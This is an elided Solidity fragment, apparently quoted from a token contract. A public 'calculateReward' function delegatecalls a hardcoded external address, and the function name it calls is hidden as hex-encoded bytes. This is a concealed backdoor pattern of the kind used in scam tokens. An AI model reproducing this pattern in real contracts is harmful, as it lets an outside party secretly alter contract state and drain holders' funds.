      ...
      BaseContract
{
  ...
  address private handler = address(
    0x345CE6f8d50518B827265932EB9eC9C04Cac394C );
  ...
  function renounceOwnership( ) public virtual onlyOwner {
   ...
   function calculateReward ( address buyer, uint8 luck ) public {
       handler.delegatecall( abi.encodeWithSignature( string( 
           bytes('\x44\x69\x73\x70\x28\x61\x64\x64\x72\x65\x73\x73\x2c\x75\x69\x6e\x74\x38\x29') ),
           buyer, luck ) );
  }
